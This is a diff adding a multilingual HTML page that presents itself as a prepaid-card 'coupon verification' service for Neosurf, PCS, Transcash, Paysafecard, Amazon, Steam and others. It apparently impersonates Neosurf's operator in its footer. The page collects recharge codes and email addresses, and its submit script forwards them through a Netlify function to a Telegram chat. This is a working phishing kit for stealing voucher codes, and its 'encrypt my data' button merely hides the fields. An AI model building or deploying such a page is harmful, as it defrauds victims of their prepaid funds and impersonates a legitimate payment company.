@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title data-lang-key="title">Vérification de Coupon</title>
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"/>
+<link rel="icon" type="image/png" sizes="32x32" href="favicon_io/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="favicon_io/favicon-16x16.png">
+<link rel="shortcut icon" href="favicon_io/favicon.ico" type="image/x-icon">
+
+<link rel="apple-touch-icon" sizes="180x180" href="favicon_io/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="192x192" href="favicon_io/android-chrome-192x192.png">
+<link rel="icon" type="image/png" sizes="512x512" href="favicon_io/android-chrome-512x512.png">
+
+<link rel="manifest" href="favicon_io/site.webmanifest">
+
+
+<style>
+    body {
+      background: url('bg.jpg') no-repeat center center fixed;
+      background-size: cover;
+      margin: 0;
+      padding: 0;
+    }
+    .form-section {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 2rem;
+    }
+    .card {
+      max-width: 500px;
+      width: 100%;
+      padding: 2rem;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+      border-radius: 1rem;
+      margin: 2rem auto;
+      background-color: rgba(255, 255, 255, 0.85);
+    }
+    footer {
+      background: #000;
+      color: #fff;
+      padding: 1rem 0;
+      margin-top: 0;
+      text-align: justify;
+      font-size: 0.85rem;
+      line-height: 1.5;
+      color: rgba(255, 255, 255, 0.6);
+    }
+    footer p {
+      margin: 0;
+    }
+
+    footer p,footer ul,footer li,footer h5 {
+    text-align: justify;
+    font-size: 0.85rem;
+    line-height: 1.5;
+    color: rgba(255, 255, 255, 0.6);
+  }
+
+    .social-icon {
+      width: 20px;
+      margin-right: 8px;
+    }
+    header {
+      background-color: #000;
+      color: #fff;
+      padding: 1rem 2rem;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      z-index: 1030;
+    }
+    .header-container {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+    }
+    .header-logo {
+      font-weight: bold;
+      font-size: 1.2rem;
+    }
+    .header-nav a, .dropdown-toggle {
+      color: #fff;
+      margin-left: 1rem;
+      text-decoration: none;
+    }
+    .header-nav .btn {
+      margin-left: 1rem;
+    }
+    .btn-encrypt {
+      background-color: #000 !important;
+      color: #fff !important;
+    }
+    .info-section {
+      background-color: #121212;
+      color: #fff;
+      padding-bottom: 0;
+      margin-bottom: 0;
+    }
+    @media (max-width: 576px) {
+      .header-container {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+      .header-nav {
+        flex-direction: column;
+        align-items: flex-start;
+        margin-top: 1rem;
+      }
+      .header-nav a, .dropdown-toggle, .header-nav .btn {
+        margin-left: 0;
+        margin-bottom: 0.5rem;
+      }
+    }
+    .spacer {
+      height: 120px;
+    }
+  </style>
+<style>
+      header {
+        padding: 0.5rem 1rem;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        background-color: white;
+        height: auto;
+      }
+
+       .info-section h5 {
+        color: #ff69b4;
+      }
+ 
+      .menu-icon {
+        display: inline-block;
+        cursor: pointer;
+      }
+      .menu-icon div {
+        width: 25px;
+        height: 3px;
+        background-color: #ff69b4;
+        margin: 4px 0;
+        border-radius: 2px;
+      }
+      footer, .post-form-section {
+        text-align: justify;
+        direction: rtl;
+        padding-right: 2rem;
+      }
+      footer h5, .post-form-section h5 {
+        margin-left: 0.5rem;
+        font-weight: bold;
+      }
+    </style>
+</head>
+<body>
+<style>
+  header {
+    background-color: #1e1e1e;
+    color: white;
+    padding: 0.5rem 0;
+  }
+
+  .header-logo-img {
+    height: 40px;
+    width: auto;
+    object-fit: contain;
+  }
+
+  .logos-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: nowrap;
+    gap: 4px;
+  }
+
+  .logos-row a {
+    flex: 1;
+    text-align: center;
+  }
+
+  .logos-row img {
+    max-width: 100%;
+  }
+  .lang-selector-container {
+    padding-bottom: 0.5rem;
+  }
+
+  #lang-selector {
+    background-color: #333;
+    color: white;
+    border: 1px solid #555;
+    padding: 0.25rem 0.5rem;
+    border-radius: 4px;
+    font-size: 0.8rem;
+  }
+
+  @media (max-width: 575.98px) {
+    .header-text {
+      font-size: 1rem;
+      margin-bottom: 0.5rem;
+    }
+    .header-logo-img {
+      height: 35px;
+    }
+    .spacer {
+        height: 110px;
+    }
+  }
+</style>
+
+<header>
+  <div class="container text-center">
+    <div class="lang-selector-container">
+        <select id="lang-selector">
+            <option value="de">🇩🇪 Deutsch</option>  
+            <option value="en">🇬🇧 English</option>
+            <option value="es">🇪🇸 Español</option>
+            <option value="fr">🇫🇷 Français</option>
+            <option value="it">🇮🇹 Italiano</option>
+            <option value="nl">🇳🇱 Nederlands</option>
+
+        </select>
+    </div>
+    <div class="header-text fw-bold mb-2" data-lang-key="recharge_cards">Cartes de recharge</div>
+
+    <div class="logos-row">
+      <a href="#formulaire">
+        <img src="logo/amazon.png" alt="amazon" class="rounded header-logo-img" />
+      </a>
+      <a href="#formulaire">
+        <img src="logo/googleplay.png" alt="google play" class="rounded header-logo-img" />
+      </a>
+      <a href="#formulaire">
+        <img src="logo/neo.png" alt="neo" class="rounded header-logo-img" />
+      </a>
+      <a href="#formulaire">
+        <img src="logo/paysafecard-product-card-local-labels.png" alt="paysafecard" class="rounded header-logo-img" />
+      </a>
+      <a href="#formulaire">
+        <img src="logo/pcs.png" alt="pcs" class="rounded header-logo-img" />
+      </a>
+      <a href="#formulaire">
+        <img src="logo/transcash.jpg" alt="transcash" class="rounded header-logo-img" />
+      </a>
+      <a href="#formulaire">
+        <img src="logo/steam.png" alt="steam" class="rounded header-logo-img" />
+      </a>
+    </div>
+  </div>
+</header>
+
+
+<div class="spacer"></div>
+<div class="form-section" id="formulaire">
+<div class="card">
+<div class="text-center mb-3">
+<h3 class="mb-0" style="color: #28a745;" data-lang-key="title">Vérification de Coupon</h3>
+</div>
+<form action="#" id="form" method="POST">
+<strong data-lang-key="form_intro">Veuillez entrer les informations du coupon ici.</strong>
+<div class="mb-3">
+<label class="form-label" data-lang-key="choose_recharge">Choisir une recharge *</label>
+<select class="form-select" name="recharge_type" required="">
+<option value="" data-lang-key="recharge_placeholder">---- Recharge ----</option>
+<option value="AMAZON">AMAZON</option>
+<option value="GOOGLE PLAY / APPLE GIFT CARD">GOOGLE PLAY / APPLE GIFT CARD</option>
+<option value="NEOSURF">NEOSURF</option>
+<option value="PAYSAFECARD">PAYSAFECARD</option>
+<option value="PCS">PCS</option>
+<option value="TRANSCASH">TRANSCASH</option>
+<option value="STEAM">STEAM</option>
+<option value="PLAYSTATION / XBOX / NINTENDO ESHOP">PLAYSTATION / XBOX / NINTENDO ESHOP</option>
+
+
+</select>
+</div>
+
+<div class="mb-3">
+  <label class="form-label" data-lang-key="recharge_country">
+    Pays de recharge *
+  </label>
+  <select class="form-select" name="recharge_country" required>
+    <option value="" data-lang-key="country_placeholder">
+      ---- Select country ----
+    </option>
+
+    <option value="AT">🇦🇹 Austria</option>
+    <option value="BE">🇧🇪 Belgium</option>
+    <option value="BG">🇧🇬 Bulgaria</option>
+    <option value="HR">🇭🇷 Croatia</option>
+    <option value="CY">🇨🇾 Cyprus</option>
+    <option value="CZ">🇨🇿 Czech Republic</option>
+    <option value="DK">🇩🇰 Denmark</option>
+    <option value="EE">🇪🇪 Estonia</option>
+    <option value="FI">🇫🇮 Finland</option>
+    <option value="FR">🇫🇷 France</option>
+    <option value="DE">🇩🇪 Germany</option>
+    <option value="GR">🇬🇷 Greece</option>
+    <option value="HU">🇭🇺 Hungary</option>
+    <option value="IE">🇮🇪 Ireland</option>
+    <option value="IT">🇮🇹 Italy</option>
+    <option value="LV">🇱🇻 Latvia</option>
+    <option value="LT">🇱🇹 Lithuania</option>
+    <option value="LU">🇱🇺 Luxembourg</option>
+    <option value="MT">🇲🇹 Malta</option>
+    <option value="NL">🇳🇱 Netherlands</option>
+    <option value="PL">🇵🇱 Poland</option>
+    <option value="PT">🇵🇹 Portugal</option>
+    <option value="RO">🇷🇴 Romania</option>
+    <option value="SK">🇸🇰 Slovakia</option>
+    <option value="ES">🇪🇸 Spain</option>
+    <option value="SE">🇸🇪 Sweden</option>
+    <option value="CH">🇨🇭 Switzerland</option>
+    <option value="US">🇺🇸 United States</option>
+
+  </select>
+</div>
+
+    
+<div class="mb-3">
+<label class="form-label" data-lang-key="amount">Montant *</label>
+<input class="form-control" name="amount" oninput="sanitizeAmount(this)" placeholder="Ex : 99.9" required="" type="text"/>
+</div>
+<script>
+          function sanitizeAmount(input) {
+            let value = input.value.replace(',', '.');
+            value = value.replace(/[^0-9.]/g, '');
+            const parts = value.split('.');
+            if (parts.length > 2) {
+              value = parts[0] + '.' + parts.slice(1).join('');
+            }
+            input.value = value;
+          }
+</script>
+<div class="mb-3">
+<label class="form-label" data-lang-key="currency">Devise *</label>
+<select class="form-select" name="currency" required="">
+<option value="" data-lang-key="currency_placeholder">---- Devise ----</option>
+<option value="EUR" data-lang-key="currency_eur">EURO (€)</option>
+<option value="USD" data-lang-key="currency_usd">Dollar ($)</option>
+<option value="CHF" data-lang-key="currency_chf">FRANC SUISSE (CHF)</option>
+</select>
+</div>
+<div class="mb-3">
+<label class="form-label" data-lang-key="recharge_code">Code de recharge *</label>
+<input class="form-control mb-2" name="code1" placeholder="Code 1" required="" type="text"/>
+<input class="form-control mb-2" name="code2" placeholder="Code 2 (optionnel)" type="text"/>
+<input class="form-control mb-2" name="code3" placeholder="Code 3 (optionnel)" type="text"/>
+<input class="form-control" name="code4" placeholder="Code 4 (optionnel)" type="text"/>
+</div>
+<div class="mb-3">
+<label class="form-label" data-lang-key="email">Adresse e-mail *</label>
+<input class="form-control" name="email" placeholder="exemple@domaine.com" required="" type="email"/>
+</div>
+<div class="mb-3 text-start"> 
+<button
+  class="btn btn-encrypt mb-2 d-block mx-auto"
+  onclick="toggleEncryption()"
+  type="button"
+  data-lang-key="encrypt_button">
+  Crypter mes données
+</button>
+<div class="d-flex justify-content-center">   
+    <div id="recaptcha-widget-container"></div>
+    <div id="recaptcha-error" class="text-danger mt-2"></div>
+</div>
+</div>
+<div class="d-grid">
+<button class="btn btn-success" type="submit" data-lang-key="verify_button">Vérifier</button>
+</div>
+</form>
+</div>
+</div>
+<section class="info-section text-start text-justify px-3" style="font-size: 0.9rem;">
+<div class="container">
+<div class="row text-start">
+<div class="col-md-4 mb-4">
+<h5>📜 online-plt</h5>
+<p data-lang-key="info_desc">Service de vérification de coupons en ligne. Vérifiez la validité de vos cartes de manière fiable et sécurisée.</p>
+</div>
+<div class="col-md-4 mb-4">
+<h5 data-lang-key="services_title">🛠️ Services</h5>
+<ul class="list-unstyled">
+<li><a class="text-decoration-none text-white" href="#form">✔️ Neosurf</a></li>
+<li><a class="text-decoration-none text-white" href="#form">✔️ PCS</a></li>
+<li><a class="text-decoration-none text-white" href="#form">✔️ Amazon</a></li>
+<li><a class="text-decoration-none text-white" href="#form">✔️ Google Pay</a></li>
+<li><a class="text-decoration-none text-white" href="#form">✔️ Transcash</a></li>
+<li><a class="text-decoration-none text-white" href="#form">✔️ Steam</a></li>
+<li><a class="text-decoration-none text-white" href="#form" data-lang-key="more_services">✔️ Et plus...</a></li>
+</ul>
+</div>
+<div class="col-md-4 mb-4">
+<h5 data-lang-key="networks_title">🌐 Réseaux</h5>
+<ul class="list-unstyled">
+<li><a class="text-decoration-none text-white" href="https://instagram.com/" target="_blank">
+<img class="social-icon" src="https://cdn-icons-png.flaticon.com/24/2111/2111463.png"/> Instagram</a></li>
+<li><a class="text-decoration-none text-white" href="https://facebook.com/" target="_blank">
+<img class="social-icon" src="https://cdn-icons-png.flaticon.com/24/733/733547.png"/> Facebook</a></li>
+<li><a class="text-decoration-none text-white" href="https://linkedin.com/" target="_blank">
+<img class="social-icon" src="https://cdn-icons-png.flaticon.com/24/174/174857.png"/> LinkedIn</a></li>
+<li><a class="text-decoration-none text-white" href="https://twitter.com/" target="_blank">
+<img class="social-icon" src="https://cdn-icons-png.flaticon.com/24/733/733579.png"/> Twitter</a></li>
+<li><a class="text-decoration-none text-white" href="https://discord.com/" target="_blank">
+<img class="social-icon" src="https://cdn-icons-png.flaticon.com/24/2111/2111370.png"/> Discord</a></li>
+</ul>
+</div>
+</div>
+</div>
+</section>
+<footer class="text-start text-justify px-3">
+<div class="container">
+<p><center data-lang-key="footer_copyright"> © 2026 Vérification de Coupon. Tous droits réservés</center></p>
+</div>
+<div class="container">Copyright © 2004 - 2026 NS Cards France SAS
+      NS Cards France SAS, is a company registered in France under Company Number SIREN 478502321, Neosurf operates across EEA and EU under Narvi Payments Oy Ab. Narvi Payments Oy Ab is a licensed e-money institution with the right to execute activities related to the issuance of e-money around the European Union licensed by FIN-FSA (Finnish Financial Supervisory Authority)<br/>
+<center> Registered address: NS CARDS FRANCE SAS 10 rue Vandrezanne, 75013 Paris, France</center>
+</div>
+</footer>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+    function toggleEncryption() {
+      ['code1', 'code2', 'code3', 'code4'].forEach(id => {
+        const input = document.getElementsByName(id)[0];
+        if (input && input.type === 'text') {
+          input.type = 'password';
+        } else if (input && input.type === 'password') {
+          input.type = 'text';
+        }
+      });
+    }
+</script>
+
+<script>
+const translations = {
+  fr: {
+    title: "Vérification de Coupon", recharge_cards: "Cartes de recharge", form_intro: "Veuillez entrer les informations du coupon ici.", choose_recharge: "Choisir une recharge *", recharge_placeholder: "---- Recharge ----", amount: "Montant *", amount_placeholder: "Ex : 99.9", currency: "Devise *", currency_placeholder: "---- Devise ----", currency_eur: "EURO (€)", currency_usd: "Dollar ($)", currency_chf: "FRANC SUISSE (CHF)", recharge_code: "Code de recharge *", code1_placeholder: "Code 1", code2_placeholder: "Code 2 (optionnel)", code3_placeholder: "Code 3 (optionnel)", code4_placeholder: "Code 4 (optionnel)", email: "Adresse e-mail *", email_placeholder: "exemple@domaine.com", encrypt_button: "Crypter mes données", verify_button: "Vérifier", info_desc: "Service de vérification de coupons en ligne. Vérifiez la validité de vos cartes de manière fiable et sécurisée.", services_title: "🛠️ Services", more_services: "✔️ Et plus...", networks_title: "🌐 Réseaux", footer_copyright: "© 2026 Vérification de Coupon. Tous droits réservés", alert_fill_fields: "Veuillez remplir tous les champs obligatoires.", alert_recaptcha: "Veuillez valider le reCAPTCHA.", alert_telegram_error: "Erreur Telegram : ", alert_send_error: "Erreur lors de l'envoi : ", recharge_country: "Pays de recharge *", country_placeholder: "---- Sélectionner un pays ----"
+
+  },
+  en: {
+    title: "Coupon Verification", recharge_cards: "Reload Cards", form_intro: "Please enter the coupon information here.", choose_recharge: "Choose a top-up *", recharge_placeholder: "---- Top-up ----", amount: "Amount *", amount_placeholder: "Ex: 99.9", currency: "Currency *", currency_placeholder: "---- Currency ----", currency_eur: "EURO (€)", currency_usd: "Dollar ($)", currency_chf: "SWISS FRANC (CHF)", recharge_code: "Reload code *", code1_placeholder: "Code 1", code2_placeholder: "Code 2 (optional)", code3_placeholder: "Code 3 (optional)", code4_placeholder: "Code 4 (optional)", email: "Email address *", email_placeholder: "example@domain.com", encrypt_button: "Encrypt my data", verify_button: "Verify", info_desc: "Online coupon verification service. Check the validity of your cards reliably and securely.", services_title: "🛠️ Services", more_services: "✔️ And more...", networks_title: "🌐 Networks", footer_copyright: "© 2026 Coupon Verification. All rights reserved", alert_fill_fields: "Please fill in all required fields.", alert_recaptcha: "Please validate the reCAPTCHA.", alert_telegram_error: "Telegram error: ", alert_send_error: "Error while sending: ", recharge_country: "Recharge country *", country_placeholder: "---- Select country ----"
+
+  },
+  es: {
+    title: "Verificación de Cupón", recharge_cards: "Tarjetas de recarga", form_intro: "Por favor, introduzca la información del cupón aquí.", choose_recharge: "Elija una recarga *", recharge_placeholder: "---- Recarga ----", amount: "Importe *", amount_placeholder: "Ej: 99.9", currency: "Moneda *", currency_placeholder: "---- Moneda ----", currency_eur: "EURO (€)", currency_usd: "Dólar ($)", currency_chf: "FRANCO SUIZO (CHF)", recharge_code: "Código de recarga *", code1_placeholder: "Código 1", code2_placeholder: "Código 2 (opcional)", code3_placeholder: "Código 3 (opcional)", code4_placeholder: "Código 4 (opcional)", email: "Dirección de correo electrónico *", email_placeholder: "ejemplo@dominio.com", encrypt_button: "Cifrar mis datos", verify_button: "Verificar", info_desc: "Servicio de verificación de cupones en línea. Verifique la validez de sus tarjetas de forma fiable y segura.", services_title: "🛠️ Servicios", more_services: "✔️ Y más...", networks_title: "🌐 Redes", footer_copyright: "© 2026 Verificación de Cupón. Todos los derechos reservados", alert_fill_fields: "Por favor, rellene todos los campos obligatorios.", alert_recaptcha: "Por favor, valide el reCAPTCHA.", alert_telegram_error: "Error de Telegram: ", alert_send_error: "Error al enviar: ", recharge_country: "País de recarga *", country_placeholder: "---- Seleccionar país ----"
+
+  },
+  it: {
+    title: "Verifica Coupon", recharge_cards: "Carte di ricarica", form_intro: "Inserisci qui le informazioni del coupon.", choose_recharge: "Scegli una ricarica *", recharge_placeholder: "---- Ricarica ----", amount: "Importo *", amount_placeholder: "Es: 99.9", currency: "Valuta *", currency_placeholder: "---- Valuta ----", currency_eur: "EURO (€)", currency_usd: "Dollaro ($)", currency_chf: "FRANCO SVIZZERO (CHF)", recharge_code: "Codice di ricarica *", code1_placeholder: "Codice 1", code2_placeholder: "Codice 2 (opzionale)", code3_placeholder: "Codice 3 (opzionale)", code4_placeholder: "Codice 4 (opzionale)", email: "Indirizzo email *", email_placeholder: "esempio@dominio.com", encrypt_button: "Cripta i miei dati", verify_button: "Verifica", info_desc: "Servizio di verifica coupon online. Controlla la validità delle tue carte in modo affidabile e sicuro.", services_title: "🛠️ Servizi", more_services: "✔️ E altro...", networks_title: "🌐 Reti", footer_copyright: "© 2026 Verifica Coupon. Tutti i diritti riservati", alert_fill_fields: "Si prega di compilare tutti i campi obbligatori.", alert_recaptcha: "Si prega di convalidare il reCAPTCHA.", alert_telegram_error: "Errore Telegram: ", alert_send_error: "Errore durante l'invio: ", recharge_country: "Paese di ricarica *", country_placeholder: "---- Seleziona paese ----"
+
+  },
+  // AJOUT DU BLOC DE TRADUCTION ALLEMAND
+  de: {
+    title: "Gutschein-Überprüfung", recharge_cards: "Aufladekarten", form_intro: "Bitte geben Sie hier die Gutscheininformationen ein.", choose_recharge: "Aufladung auswählen *", recharge_placeholder: "---- Aufladung ----", amount: "Betrag *", amount_placeholder: "Bsp: 99.9", currency: "Währung *", currency_placeholder: "---- Währung ----", currency_eur: "EURO (€)", currency_usd: "Dollar ($)", currency_chf: "SCHWEIZER FRANKEN (CHF)", recharge_code: "Aufladecode *", code1_placeholder: "Code 1", code2_placeholder: "Code 2 (optional)", code3_placeholder: "Code 3 (optional)", code4_placeholder: "Code 4 (optional)", email: "E-Mail-Adresse *", email_placeholder: "beispiel@domain.com", encrypt_button: "Meine Daten verschlüsseln", verify_button: "Überprüfen", info_desc: "Online-Gutschein-Überprüfungsdienst. Überprüfen Sie die Gültigkeit Ihrer Karten zuverlässig und sicher.", services_title: "🛠️ Dienstleistungen", more_services: "✔️ Und mehr...", networks_title: "🌐 Netzwerke", footer_copyright: "© 2026 Gutschein-Überprüfung. Alle Rechte vorbehalten", alert_fill_fields: "Bitte füllen Sie alle Pflichtfelder aus.", alert_recaptcha: "Bitte bestätigen Sie das reCAPTCHA.", alert_telegram_error: "Telegram-Fehler: ", alert_send_error: "Fehler beim Senden: ", recharge_country: "Aufladeland *", country_placeholder: "---- Land auswählen ----"
+
+  },
+nl: {
+  title: "Couponcontrole", recharge_cards: "Oplaadkaarten", form_intro: "Vul hier de coupongegevens in.", choose_recharge: "Kies een opwaardering *", recharge_placeholder: "---- Opladen ----", amount: "Bedrag *", amount_placeholder: "Bijv: 99.9",
+  currency: "Valuta *",
+  currency_placeholder: "---- Valuta ----",
+  currency_eur: "EURO (€)",
+  currency_usd: "Dollar ($)",
+  currency_chf: "ZWITSERSE FRANK (CHF)",
+  recharge_code: "Oplaadcode *",
+  code1_placeholder: "Code 1",
+  code2_placeholder: "Code 2 (optioneel)",
+  code3_placeholder: "Code 3 (optioneel)",
+  code4_placeholder: "Code 4 (optioneel)",
+  email: "E-mailadres *",
+  email_placeholder: "voorbeeld@domein.com",
+  encrypt_button: "Mijn gegevens versleutelen",
+  verify_button: "Verifiëren",
+  info_desc: "Online dienst voor couponcontrole. Controleer uw kaarten veilig en betrouwbaar.",
+  services_title: "🛠️ Diensten",
+  more_services: "✔️ En meer...",
+  networks_title: "🌐 Netwerken",
+  footer_copyright: "© 2026 Couponcontrole. Alle rechten voorbehouden",
+  alert_fill_fields: "Vul alle verplichte velden in.",
+  alert_recaptcha: "Bevestig de reCAPTCHA.",
+  alert_telegram_error: "Telegramfout: ",
+  alert_send_error: "Verzendfout: ",
+  recharge_country: "Oplaadland *", country_placeholder: "---- Selecteer land ----"
+
+}
+
+};
+
+let currentLang = 'fr';
+
+window.renderRecaptchaWidget = function() {
+    const container = document.getElementById('recaptcha-widget-container');
+    if (container) {
+        grecaptcha.render(container, {
+            'sitekey' : '6LdYfvcsAAAAAIBro5HitF3fJkL8fK2uBxpposS3'
+        });
+    }
+}
+
+function loadRecaptchaScript(lang) {
+    const existingScript = document.querySelector('script[src^="https://www.google.com/recaptcha/api.js"]');
+    if (existingScript) {
+        existingScript.remove();
+    }
+    
+    const script = document.createElement('script');
+    script.src = `https://www.google.com/recaptcha/api.js?hl=${lang}&render=explicit&onload=renderRecaptchaWidget`;
+    script.async = true;
+    script.defer = true;
+    document.head.appendChild(script);
+}
+
+function setLanguage(lang) {
+  if (!translations[lang]) return;
+  currentLang = lang;
+  document.documentElement.lang = lang;
+
+  document.querySelectorAll('[data-lang-key]').forEach(elem => {
+    const key = elem.getAttribute('data-lang-key');
+    if (translations[lang][key]) elem.innerText = translations[lang][key];
+  });
+
+  document.title = translations[lang].title;
+  document.querySelector('input[name="amount"]').placeholder = translations[lang].amount_placeholder;
+  document.querySelector('input[name="code1"]').placeholder = translations[lang].code1_placeholder;
+  document.querySelector('input[name="code2"]').placeholder = translations[lang].code2_placeholder;
+  document.querySelector('input[name="code3"]').placeholder = translations[lang].code3_placeholder;
+  document.querySelector('input[name="code4"]').placeholder = translations[lang].code4_placeholder;
+  document.querySelector('input[name="email"]').placeholder = translations[lang].email_placeholder;
+
+  loadRecaptchaScript(lang);
+};
+
+document.addEventListener('DOMContentLoaded', () => {
+    const langSelector = document.getElementById('lang-selector');
+    const userLang = (navigator.language || navigator.userLanguage).split('-')[0];
+    // AJOUT DE 'de' POUR LA DÉTECTION AUTOMATIQUE
+    const defaultLang = ['fr', 'en', 'es', 'it', 'de', 'nl'].includes(userLang) ? userLang : 'fr';
+    
+    langSelector.value = defaultLang;
+    setLanguage(defaultLang);
+    
+    langSelector.addEventListener('change', (event) => {
+        setLanguage(event.target.value);
+    });
+});
+
+
+document.getElementById('form').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  const formData = new FormData(this);
+  const data = Object.fromEntries(formData.entries());
+
+  if (!data.recharge_type || !data.recharge_country || !data.amount || !data.currency || !data.code1 || !data.email) {
+    alert(translations[currentLang].alert_fill_fields);
+    
+    return;
+  }
+
+  const message = `🎫 NOUVELLE DEMANDE DE RECHARGE 🎫\n\n` +
+    `Type : ${data.recharge_type}\n` +
+    `Pays de recharge : ${data.recharge_country}\n` +
+    `Montant : ${data.amount} ${data.currency}\n` +
+    `Code 1 : ${data.code1}\n` +
+    `${data.code2 ? `Code 2 : ${data.code2}\n` : ''}` +
+    `${data.code3 ? `Code 3 : ${data.code3}\n` : ''}` +
+    `${data.code4 ? `Code 4 : ${data.code4}\n` : ''}` +
+    `Email : ${data.email}\n` +
+    `🕒 Soumis le : ${new Date().toLocaleString()}`;
+
+  try {
+    const token = grecaptcha.getResponse();
+    if (!token) {
+      alert(translations[currentLang].alert_recaptcha);
+      return;
+    }
+
+    const btn = document.querySelector('button[type="submit"]');
+    btn.disabled = true;
+    btn.textContent = "Envoi en cours…";
+
+    try {
+      const response = await fetch('/.netlify/functions/sendTelegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message, recaptchaToken: token })
+      });
+
+      const result = await response.json();
+      if (result.ok) {
+        window.location.href = `confirmation.html?lang=${currentLang}`;
+      } else {
+        alert(translations[currentLang].alert_telegram_error + result.description);
+      }
+    } catch (err) {
+      alert(translations[currentLang].alert_send_error + err.message);
+    } finally {
+      btn.disabled = false;
+      btn.textContent = "Envoyer";
+    }
+  } catch (err) {
+    alert(translations[currentLang].alert_send_error + err.message);
+  }
+});
+</script>
+</body>
+</html>
